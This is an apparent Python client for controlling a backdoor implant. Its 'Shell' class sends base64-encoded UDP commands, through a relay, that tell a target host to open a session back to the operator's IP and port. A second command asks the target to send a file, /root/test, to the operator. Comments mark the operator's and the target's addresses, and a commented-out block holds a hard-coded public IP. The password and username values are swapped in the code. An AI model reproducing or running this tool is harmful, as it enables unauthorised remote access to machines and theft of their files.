import base64
import socket
import time

class Shell:
    def __init__(self, 
            lhost:str,
            lport:int,
            rhost:str,
            rport:int,
            relay_host:str,
            relay_port:int,
            session_user:str,
            session_pass:str,
            sfilename=None):
        self.lport = lport
        self.lhost = lhost
        self.rhost = rhost
        self.rport = rport
        self.relay_host = relay_host
        self.relay_port = relay_port
        self.session_pass = session_pass
        self.session_user = session_user
        self.sfilename = sfilename

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def encode_base64(self, target:str) -> str:
        return base64.b64encode(str(target).encode())

    def decode_base64(self, target:str) ->str:
        return base64.b64decode(target).decode()
    
    def door(self):
        
        addr = (self.relay_host, self.relay_port)
        
        payload = "<DOOR><PASS>{Pass}</PASS><USER>{user}</USER><HOST>{lhost}</HOST><PORT>{lport}</PORT></DOOR>".format(
                Pass = self.session_user,
                user = self.session_pass,
                lhost = self.lhost,
                lport = self.lport)
        payload = self.encode_base64(payload)
        payload = str(payload, "utf-8")
        payload_len = len(list(payload))
         
        print(payload, payload_len)
        payload_m = "<EN41><HEADER><DATA_TYPE></DATA_TYPE><DATA_LEN>{}</DATA_LEN></HEADER><SEND><HOST>{}</HOST><MSG>{}</MSG></SEND></EN41>".format(payload_len, self.rhost, payload)
        

        payload_m = self.encode_base64(payload_m)
        payload_m_len = len(list(payload_m))
        
        self.sock.sendto(payload_m, addr)
        
        # time for timeout is 4sec.
        self.sock.settimeout(4);
        try:
            r= self.sock.recv(1024)
            print("#",self.decode_base64(r))

        except Exception as e:
            print("#{}\nrport may not be set correctly".format(e))
         
        self.sock.close()
    
    def cp(self):
        payload = "<CP><PASS>{Pass}</PASS><USER>{user}</USER><HOST>{lhost}</HOST><PORT>{lport}</PORT><FILENAME>{fname}</FILENAME></CP>".format(
            Pass = self.session_user,
            user = self.session_pass,
            lhost = self.lhost,
            lport = self.lport,
            fname = self.sfilename)
        
        self.sock.sendto(self.encode_base64(payload),(self.rhost, self.rport))
        # time for timeout is 4sec.
        self.sock.settimeout(4);
        try:
            r= self.sock.recv(1024)
            print("[*]",self.decode_base64(r))

        except Exception as e:
            print("[!]{}\nrport may not be set correctly".format(e))
            
        self.sock.close()
    
if __name__ == "__main__":
    
    """
    door_session = Shell(
            lhost = "58.94.136.200",    # your ip address
            lport = 8080 ,           # your opne port
            rhost = "1.1.1.1",    # target host 
            rport = 41444,          # target setting port 
            session_pass= "admin",  # target door session password
            session_user = "admin",  # target door session user 
            )
    
    door_session.door()
    """
    session = Shell(
            lhost = "192.168.2.106",    # your ip address
            lport = 8080,           # your opne port
            rhost = "192.168.2.106",    # target host 
            rport = 41444,          # target setting port 
            relay_host = "192.168.2.106",
            relay_port = 41222,
            session_pass= "admin",  # target door session password
            session_user = "admin",  # target door session user 
            sfilename="/root/test"
            )
        
    session.door()
    #session.cp() 
